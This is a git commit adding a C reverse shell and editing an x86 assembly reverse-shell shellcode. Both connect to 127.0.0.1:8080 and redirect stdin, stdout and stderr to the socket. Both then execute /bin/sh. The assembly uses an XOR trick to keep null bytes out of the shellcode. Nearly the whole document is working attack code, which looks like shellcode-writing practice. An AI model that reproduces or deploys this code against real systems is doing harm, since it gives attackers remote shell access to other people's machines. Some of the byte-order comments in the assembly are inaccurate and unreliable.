fe805a457878f0d4df438b4de3b9c48a5898d70d
Denis-REMACLE <denis.remacle@outlook.fr>
2022-01-17 19:27:37 +0100

    added c code

--- reverser.asm
+++ reverser.asm
@@ -5,35 +5,38 @@ _start:
 ; We first need to create a socket
 ; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
     push        0x66
-    pop         eax         ; socketcall (102)
+    pop         eax             ; socketcall (102)
     push        0x1
-    pop         ebx         ; SYS_SOCKET (1)
+    pop         ebx             ; SYS_SOCKET (1)
 
-    xor         ecx, ecx    ; zero ecx
-    push        ecx         ; protocol (0)
-    push        ebx         ; SOCK_STREAM (1)
-    push        0x2         ; AF_INET (2)
+    xor         ecx, ecx        ; zero ecx
+    push        ecx             ; protocol (0)
+    push        ebx             ; SOCK_STREAM (1)
+    push        0x2             ; AF_INET (2)
 
     mov         ecx, esp
-    int         80h         ; execute
+    int         80h             ; execute
     mov         edi, eax
     mov         esi, 3
 
 ; Then connect to ip and port
-    mov         eax, 0x66   ; socketcall (102)
+    mov         eax, 0x66       ; socketcall (102)
     pop         ebx
-    push        0x0101017F  ; ip_address = 127.1.1.1
-    push        word 0x50   ; port = 80
+    mov         ecx, 0xfeffff80
+    xor         ecx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
+    push        ecx             ; ip_address = 127.0.0.1 = 7F010101: need to put it in reverse
+    push        word 0x901F     ; port = 8080 = 1F90; need to put it in reverse
+    xor         ecx, ecx
 
-    push        bx          ; AF_INET (2)
+    push        bx              ; AF_INET (2)
     mov         ecx, esp
     push        0x10
     push        ecx
 
     push        edi
     mov         ecx, esp
-    inc         ebx         ; SYS_CONNECT (3)
-    int         80h         ; execute
+    inc         ebx             ; SYS_CONNECT (3)
+    int         80h             ; execute
 
 ; Get input and redirect output
     xchg        ebx, edi
@@ -50,7 +53,7 @@ loop:
     xor         edx, edx
     push        edx
     push        0x68732f2f
-    push        0x6e69622f
+    push        0X6e69622f
 
     mov         ebx, esp
     mov         ecx, edx
---
+++ reverser.c
@@ -0,0 +1,30 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int main(void)
+{
+	int i; // used for dup2 later
+	int sockfd; // socket file descriptor
+	socklen_t socklen; // socket-length for new connections
+
+	struct sockaddr_in srv_addr; // client address
+
+	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
+	srv_addr.sin_port = htons( 8080 ); // connect-back port, converted to network byte order
+	srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order
+
+	// create new TCP socket
+	sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
+
+	// connect socket
+	connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
+
+	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
+	for(i = 0; i <= 2; i++)
+		dup2(sockfd, i);
+
+	// magic
+	execve( "/bin/sh", NULL, NULL );
+}
